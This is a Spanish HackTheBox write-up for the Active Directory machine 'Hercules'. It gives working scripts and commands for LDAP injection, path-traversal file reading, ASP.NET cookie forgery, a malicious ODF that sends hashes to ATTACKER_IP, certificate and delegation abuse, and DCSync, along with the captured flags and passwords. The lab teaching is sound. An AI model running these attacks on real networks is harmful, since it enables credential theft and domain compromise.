# Hercules — HackTheBox Writeup (Insane)

> **OS:** Windows Server (Active Directory)  
> **Difficulty:** Insane  
> **Flags:**  
> - User: `dd735a3c5fb0dc15198dae4724361295`  
> - Root: `b03de28b49f068614a2c4d9a11908a93`

---

## Resumen

Hercules es una máquina Insane de Active Directory donde **NTLM está deshabilitado**, forzando autenticación exclusivamente Kerberos. La cadena de ataque incluye:

1. Enumeración de usuarios vía Kerbrute
2. LDAP Filter Injection para extraer credenciales del campo `description`
3. LFI en la webapp para obtener `web.config` (machineKey)
4. Forja de cookie ASP.NET FormsAuth → acceso como `web_admin`
5. Upload de Bad-ODF → captura y crackeo de NetNTLMv2
6. BloodHound: cadena de abuso GenericWrite → Shadow Credentials → ESC3
7. ForceChangePassword → shell como `auditor` → user flag
8. OU Takeover → habilitar `IIS_Administrator` → controlar `IIS_Webserver$`
9. RBCD + S4U2Self/S4U2Proxy (U2U con truco de session key) → impersonar Administrator
10. DCSync → root flag

---

## 0. Configuración Inicial

### /etc/hosts
```
10.XX.XXX.XXX hercules.htb dc.hercules.htb DC.hercules.htb
```

### /etc/krb5.conf
```ini
[libdefaults]
    default_realm = HERCULES.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB
```

---

## 1. Reconocimiento

### Nmap
```bash
nmap -sC -sV -p- hercules.htb
```

Puertos relevantes:
| Puerto | Servicio |
|--------|----------|
| 53 | DNS |
| 80/443 | IIS (ASP.NET MVC) redirige HTTP→HTTPS |
| 88 | Kerberos |
| 135/445 | RPC/SMB |
| 389/636 | LDAP/LDAPS |
| 3268/3269 | Global Catalog |
| 5986 | WinRM (SSL) |

---

## 2. Enumeración de Usuarios (Kerbrute)

Generamos un diccionario con variantes `nombre.letra`:

```python
#!/usr/bin/env python3
import string

with open('/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt') as f:
    names = [line.strip() for line in f if line.strip()]

with open('names_with_letters.txt', 'w') as out:
    for name in names[:5000]:
        for letter in string.ascii_lowercase:
            out.write(f"{name}.{letter}\n")
```

```bash
kerbrute userenum --dc dc.hercules.htb -d hercules.htb names_with_letters.txt -t 100
```

Usuarios válidos encontrados: `ken.w`, `natalie.a`, `bob.w`, `ashley.b`, `stephen.m`, `fernando.r`, `johnathan.j`, etc.

---

## 3. LDAP Filter Injection — Extracción de Password

La página de login (`https://hercules.htb/Login`) es vulnerable a **LDAP Filter Injection**. Las respuestas sirven como oráculo booleano:

- **"Invalid login attempt"** → el filtro LDAP hizo match (la condición es verdadera)
- **"Invalid Username"** → no hay match

El payload requiere **doble URL encoding** para sobrevivir el pipeline ASP.NET/IIS:

```python
raw_payload = f"*)(description={prefix}*"
encoded = double_url_encode(raw_payload)  # % → %25
```

Script automatizado que extrae el campo `description` carácter por carácter:

```python
#!/usr/bin/env python3
import requests, urllib.parse, string, time, re
urllib3.disable_warnings()

TARGET = "https://hercules.htb"
CHARSET = string.printable

def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

def test_prefix(session, prefix):
    token = get_csrf_token(session)
    raw_payload = f"*)(description={prefix}*"
    data = {
        '__RequestVerificationToken': token,
        'Username': double_url_encode(raw_payload),
        'Password': 'dummy'
    }
    r = session.post(f"{TARGET}/Login", data=data, verify=False)
    if r.status_code == 429:
        time.sleep(35)
        return test_prefix(session, prefix)
    return "Invalid login attempt" in r.text

def extract():
    session = requests.Session()
    result = ""
    while True:
        found = False
        for c in CHARSET:
            if test_prefix(session, result + c):
                result += c
                print(f"[+] Found so far: {result}")
                found = True
                break
        if not found:
            break
    print(f"[*] Description: {result}")
```

**Resultado:** `change*th1s_p@ssw()rd!!`

### Validación de credenciales
```bash
# Sincronizar reloj con el DC (crucial para Kerberos)
sudo ntpdate dc.hercules.htb

# Verificar credenciales con kerbrute
kerbrute bruteuser --dc dc.hercules.htb -d hercules.htb passwords.txt ken.w
```

**Credenciales válidas:** `ken.w` : `change*th1s_p@ssw()rd!!`

---

## 4. LFI — Obtener web.config

Autenticarse en `https://hercules.htb/Login` como `ken.w`.

En `/Home/Downloads`, el parámetro `fileName` es vulnerable a **Path Traversal**:

```
GET /Home/Downloads?fileName=..\..\..\..\web.config
```

Del `web.config` extraemos el **machineKey**:

```xml
<machineKey 
  decryptionKey="B26C371E...019581" 
  validationKey="EBF9076B...18B80" 
  decryption="AES" 
  validation="HMACSHA256" />
```

---

## 5. Forjar Cookie FormsAuth → web_admin

Con las claves del `machineKey`, forjamos un ticket FormsAuth para `web_admin` usando la librería `LegacyAuthCookieCompat` (C#/.NET):

```csharp
// Program.cs - .NET Console App
using LegacyAuthCookieCompat;

var decryptionKey = HexUtils.HexToBinary("B26C371E...019581");
var validationKey = HexUtils.HexToBinary("EBF9076B...18B80");

var formsAuth = new LegacyCookieDecryptor(
    decryptionKey, validationKey,
    ShaVersion.Sha256, CompatibilityMode.Framework45);

var ticket = new FormsAuthenticationTicket(
    2, "web_admin", DateTime.Now,
    DateTime.Now.AddDays(30), true, "role=Web Administrator", "/");

string encrypted = formsAuth.Encrypt(ticket);
Console.WriteLine(encrypted);
```

Reemplazar la cookie `.ASPXAUTH` en el navegador → acceso como `web_admin`.

---

## 6. Bad-ODF → Captura NetNTLMv2

Con acceso `web_admin`, se habilita el **upload de archivos** en `/Home/Forms`.

### Generar ODF malicioso
```bash
git clone https://github.com/lof1sec/Bad-ODF
cd Bad-ODF
python3 bad-odf.py -l ATTACKER_IP -p 80
```

### Capturar hash
```bash
sudo responder -I tun0 -wv
```

Subir `bad.odt` → esperar → **Responder captura hash NetNTLMv2** de `natalie.a`.

### Crackear
```bash
hashcat -m 5600 natalie_hash.txt /usr/share/wordlists/rockyou.txt
```

**Resultado:** `natalie.a` : `Prettyprincess123!`

---

## 7. BloodHound — Mapeo de Cadena de Ataque

```bash
bloodhound-python -u natalie.a -p 'Prettyprincess123!' \
  -d hercules.htb -dc dc.hercules.htb -ns DC_IP --zip -c All
```

### Cadena identificada:

```
natalie.a (WEB SUPPORT)
    ↓ GenericWrite sobre bob.w
bob.w → Shadow Credentials → certipy → NT hash bob.w
    ↓ bob.w tiene CREATE_CHILD en "Web Department" OU
    ↓ GenericWrite sobre stephen.m
    → Mover stephen.m a "Web Department" OU (hereda permisos)
    → Shadow Credentials sobre stephen.m → NT hash
stephen.m (SECURITY HELPDESK)
    ↓ ForceChangePassword sobre auditor
auditor (REMOTE MANAGEMENT USERS + FOREST MANAGEMENT)
    → evil-winrm → user flag
    → OU Takeover de "Forest Migration"
```

---

## 8. Shadow Credentials + ESC3 → Lateral Movement

### 8.1 Shadow Credentials sobre bob.w (como natalie.a)
```bash
# Obtener TGT de natalie.a
impacket-getTGT 'hercules.htb/natalie.a:Prettyprincess123!' -dc-ip DC_IP

# Shadow credentials
export KRB5CCNAME=natalie.a.ccache
certipy shadow auto -u natalie.a@hercules.htb -k -no-pass \
  -target dc.hercules.htb -account bob.w
```

### 8.2 Mover stephen.m al Web Department OU (como bob.w)
```bash
# Usar PowerView.py
export KRB5CCNAME=bob.w.ccache
powerview hercules.htb/bob.w -k --no-pass --dc-ip DC_IP

# Dentro de PowerView:
Move-ADObject -Identity "stephen.m DN" -TargetPath "OU=Web Department,..."
```

### 8.3 Shadow Credentials sobre stephen.m
```bash
certipy shadow auto -u bob.w@hercules.htb -k -no-pass \
  -target dc.hercules.htb -account stephen.m
```

### 8.4 ForceChangePassword auditor (como stephen.m)
```bash
export KRB5CCNAME=stephen.m.ccache
bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  set password auditor 'P@ssw0rd2026!'
```

---

## 9. User Flag — Shell como Auditor

```bash
echo 'P@ssw0rd2026!' | kinit auditor@HERCULES.HTB
evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S
```

```powershell
*Evil-WinRM* PS> type C:\Users\auditor\Desktop\user.txt
dd735a3c5fb0dc15198dae4724361295
```

---

## 10. ESC3 — Certificate Abuse via Enrollment Agent

### 10.1 OU Takeover (como auditor)

```bash
export KRB5CCNAME=/tmp/krb5cc_1000  # auditor ticket

# Tomar ownership de Forest Migration OU
# (via PowerShell en evil-winrm)
```

```powershell
Import-Module ActiveDirectory
$ou = "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb"

# Set owner
$acl = Get-Acl "AD:\$ou"
$acl.SetOwner([System.Security.Principal.NTAccount]"HERCULES\auditor")
Set-Acl "AD:\$ou" $acl

# Add GenericAll for auditor
$sid = (Get-ADUser auditor).SID
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid, "GenericAll", "Allow", "Descendents")
$acl.AddAccessRule($ace)
Set-Acl "AD:\$ou" $acl
```

### 10.2 Habilitar fernando.r (miembro de Smartcard Operators)

```bash
bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  remove uac fernando.r -f ACCOUNTDISABLE

bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  set password fernando.r 'NewPass123!'
```

### 10.3 ESC3 — Enrollment Agent Certificate

```bash
# Obtener TGT fernando.r
impacket-getTGT 'hercules.htb/fernando.r:NewPass123!' -dc-ip DC_IP

# Buscar templates vulnerables
export KRB5CCNAME=fernando.r.ccache
certipy find -u fernando.r@hercules.htb -k -no-pass -dc-ip DC_IP -vulnerable

# Solicitar certificado de Enrollment Agent
certipy req -u fernando.r@hercules.htb -k -no-pass \
  -ca CA-HERCULES -template KeyEnrollmentAgentCert \
  -dc-ip DC_IP -target dc.hercules.htb -dcom

# Usar Enrollment Agent para solicitar certificado de ashley.b
certipy req -u fernando.r@hercules.htb -k -no-pass \
  -ca CA-HERCULES -template KeyUserCert \
  -on-behalf-of 'HERCULES\ashley.b' \
  -pfx fernando.r_ea.pfx \
  -dc-ip DC_IP -target dc.hercules.htb -dcom

# Autenticarse como ashley.b
certipy auth -pfx ashley.b.pfx -dc-ip DC_IP -domain hercules.htb
```

**Resultado:** `ashley.b` NT hash → `1e719fbd...9df7fd2`

---

## 11. Cadena RBCD — De ashley.b a IIS_Webserver$

### 11.1 Habilitar IIS_Administrator

```bash
# Obtener TGT ashley.b
impacket-getTGT 'hercules.htb/ashley.b' -hashes ':1e719fbd...9df7fd2' -dc-ip DC_IP

# evil-winrm como ashley.b → ejecutar cleanup
export KRB5CCNAME=ashley.b.ccache
evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S
```

```powershell
*Evil-WinRM* PS> cd C:\Users\ashley.b\Desktop
*Evil-WinRM* PS> .\aCleanup.ps1
```

> **IMPORTANTE:** Esperar ~25 segundos para que la tarea programada complete el reset.

```bash
# Re-asignar GenericAll (como auditor)
export KRB5CCNAME=/tmp/krb5cc_1000
bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'Auditor'

# Habilitar y resetear IIS_Administrator
bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  remove uac IIS_Administrator -f ACCOUNTDISABLE
bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  set password IIS_Administrator 'Passw0rd@123'

# Obtener TGT iis_administrator
impacket-getTGT 'hercules.htb/iis_administrator:Passw0rd@123' -dc-ip DC_IP
```

### 11.2 Controlar IIS_Webserver$

```bash
export KRB5CCNAME=iis_administrator.ccache

# Reset password de IIS_Webserver$ (sincroniza TODAS las claves)
bloodyAD --host dc.hercules.htb -d hercules.htb -k \
  set password 'IIS_Webserver$' 'Passw0rd@123'
```

---

## 12. S4U2Self/S4U2Proxy + U2U — El Truco de la Session Key ⭐

> **Este es el paso más crítico y difícil de la máquina.**

### Contexto
- `IIS_Webserver$` es una cuenta **USER** (no computer), sin SPNs
- `DC$` tiene `msDS-AllowedToActOnBehalfOfOtherIdentity` configurado para `IIS_Webserver$` (RBCD)
- Sin SPNs, S4U2Self requiere **U2U** (User-to-User)
- El ticket S4U2Self+U2U se cifra con la **session key del TGT**, no con la clave de largo plazo
- S4U2Proxy falla porque el KDC no puede descifrar el ticket S4U2Self (las claves no coinciden)

### Solución: Igualar la Session Key con el NT Hash

El truco es **cambiar el NT hash de la cuenta al valor de la session key del TGT**:

```bash
# 1. Calcular NT hash del password
python3 -c "
import hashlib
h = hashlib.new('md4', 'Passw0rd@123'.encode('utf-16le')).hexdigest()
print(f'NT hash: {h}')
"
# NT hash: 14d0fcda7ad363097760391f302da68d

# 2. Obtener TGT con NT hash
impacket-getTGT 'hercules.htb/IIS_Webserver$' \
  -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip DC_IP

# 3. Extraer session key del TGT
python3 -c "
from impacket.krb5.ccache import CCache
cc = CCache.loadFile('IIS_Webserver\$.ccache')
for c in cc.credentials:
    print(f'Type: {int(c[\"key\"][\"keytype\"])}')
    print(f'Session Key: {c[\"key\"][\"keyvalue\"].hex()}')
"
# Type: 23 (RC4-HMAC)
# Session Key: 83119dda0a8f29232221bdc76c1e8ff2   <-- ESTE VALOR CAMBIA CADA VEZ

# 4. ⭐ CAMBIAR el NT hash al valor de la session key
export KRB5CCNAME=IIS_Webserver\$.ccache
impacket-changepasswd 'hercules.htb/IIS_Webserver$@dc.hercules.htb' \
  -newhashes ':83119dda0a8f29232221bdc76c1e8ff2' \
  -hashes ':14d0fcda7ad363097760391f302da68d' \
  -dc-ip DC_IP -k
# [*] Password was changed successfully.

# 5. Ejecutar S4U2Self+U2U → S4U2Proxy
python3 ~/.local/bin/getST.py \
  -spn 'cifs/dc.hercules.htb' \
  -impersonate administrator \
  -dc-ip DC_IP \
  'hercules.htb/IIS_Webserver$' \
  -k -no-pass -u2u
# [*] Requesting S4U2self+U2U
# [*] Requesting S4U2Proxy
# [*] Saving ticket in administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

### ¿Por qué funciona?

1. `getTGT` con NT hash → KDC devuelve TGT con **session key** cifrada con el NT hash
2. `impacket-changepasswd -newhashes` → cambia **solo** el NT hash (no AES keys) al valor de la session key
3. Ahora: `NT hash en AD == session key del TGT`
4. S4U2Self+U2U → ticket cifrado con session key del TGT
5. S4U2Proxy → KDC descifra el ticket S4U2Self usando el **NT hash de la cuenta** (que ahora es igual a la session key) → **✅ ÉXITO**

> **Nota:** `bloodyAD set password` sincroniza TODAS las claves (NT + AES), mientras que `impacket-changepasswd -newhashes` solo cambia el NT hash. Esta diferencia es crucial.

---

## 13. DCSync + Root Flag

```bash
# Con el ticket de administrator para CIFS/dc.hercules.htb:
export KRB5CCNAME=administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache

# DCSync
impacket-secretsdump -k -no-pass dc.hercules.htb -dc-ip DC_IP \
  -just-dc-user administrator
# Administrator:500:aad3b435...ee:56855ee6...756e:::

# Obtener TGT con hash real de Administrator
impacket-getTGT 'hercules.htb/administrator' \
  -hashes ':56855ee6...756e' -dc-ip DC_IP

# Shell como Administrator
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S
```

```powershell
*Evil-WinRM* PS> whoami
hercules\administrator

*Evil-WinRM* PS> type C:\Users\Admin\Desktop\root.txt
b03de28b49f068614a2c4d9a11908a93
```

---

## Diagrama de la Cadena Completa

```
LDAP Injection → ken.w creds
        ↓
LFI (web.config) → machineKey
        ↓
Forge Cookie → web_admin
        ↓
Bad-ODF Upload → NetNTLMv2 natalie.a → crack
        ↓
natalie.a ──GenericWrite──→ bob.w (shadow creds)
        ↓
bob.w ──Move stephen.m + shadow creds──→ stephen.m
        ↓
stephen.m ──ForceChangePassword──→ auditor ──→ 🏁 USER FLAG
        ↓
auditor ──OU Takeover──→ enable fernando.r
        ↓
fernando.r ──ESC3 (Enrollment Agent)──→ ashley.b cert → NT hash
        ↓
ashley.b ──aCleanup.ps1 + GenericAll──→ enable IIS_Administrator
        ↓
IIS_Administrator ──set password──→ IIS_Webserver$
        ↓
IIS_Webserver$ ──RBCD + U2U Session Key Trick──→ S4U → Administrator ticket
        ↓
Administrator ──DCSync──→ evil-winrm ──→ 🏁 ROOT FLAG
```

---

## Lecciones Aprendidas

1. **NTLM deshabilitado** obliga a usar `-k` en todas las herramientas
2. **LDAP Injection con doble URL encoding** — el oráculo booleano permite extracción carácter por carácter
3. **machineKey** en `web.config` = forja de cookies FormsAuth
4. **Shadow Credentials** es la forma más limpia de obtener hashes sin cambiar passwords
5. **ESC3 (Enrollment Agent)** permite solicitar certificados en nombre de otros usuarios
6. **El truco de la session key** para S4U2Proxy+U2U: igualar NT hash = session key del TGT usando `impacket-changepasswd -newhashes`. Esto permite que el KDC descifre el ticket S4U2Self (cifrado con session key) usando la clave de largo plazo (que ahora es la misma)
7. **`bloodyAD set password`** vs **`impacket-changepasswd -newhashes`**: el primero sincroniza todas las claves, el segundo solo cambia NT hash. Esta diferencia es **CRUCIAL** para el ataque.

---

*Writeup by — HTB Hercules (Insane) — Active Directory / Kerberos-only*
